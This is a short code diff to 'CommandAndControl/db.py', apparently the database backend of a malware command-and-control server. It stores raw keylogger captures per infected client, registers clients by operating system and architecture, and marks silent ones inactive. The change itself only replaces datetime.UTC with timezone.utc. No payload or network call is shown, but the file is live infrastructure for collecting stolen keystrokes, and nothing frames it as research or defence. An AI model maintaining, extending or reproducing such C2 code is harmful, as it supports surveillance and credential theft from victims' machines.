@@ -1,6 +1,6 @@
 # CommandAndControl/db.py
-import sqlite3, pathlib, contextlib, datetime as dt
-from datetime import datetime, UTC
+import sqlite3, pathlib, contextlib
+from datetime import datetime, timezone, timedelta
 
 DB_PATH = pathlib.Path(__file__).with_name("c2.db")
 
@@ -29,7 +29,7 @@ CREATE TABLE IF NOT EXISTS keylogs (
 # ─── keylog helpers ──────────────────────────────────────────────────────────
 def store_log(cid: str, raw: bytes):
     import datetime as dt, pathlib
-    now =datetime.now(UTC)
+    now =datetime.now(timezone.utc)
     log_dir = pathlib.Path(__file__).with_name("logs") / cid
     log_dir.mkdir(parents=True, exist_ok=True)
 
@@ -44,7 +44,7 @@ def store_log(cid: str, raw: bytes):
 # ─── stale-client sweeper ───────────────────────────────────────────────────
 def mark_stale(threshold_secs=90):
     import datetime as dt
-    cutoff = datetime.now(UTC) - dt.timedelta(seconds=threshold_secs)
+    cutoff = datetime.now(timezone.utc) - dt.timedelta(seconds=threshold_secs)
     with contextlib.closing(get_conn()) as c:
         c.execute("""UPDATE clients
                        SET status='inactive'
@@ -63,7 +63,7 @@ with contextlib.closing(get_conn()) as c:
     c.commit()
 
 def upsert_client(cid, os_, arch_):
-    now = datetime.now(UTC)
+    now = datetime.now(timezone.utc)
     with contextlib.closing(get_conn()) as c:
         c.execute("""INSERT INTO clients(id, os, arch, status, registered, last_seen)
                      VALUES (?,?,?,?,?,?)
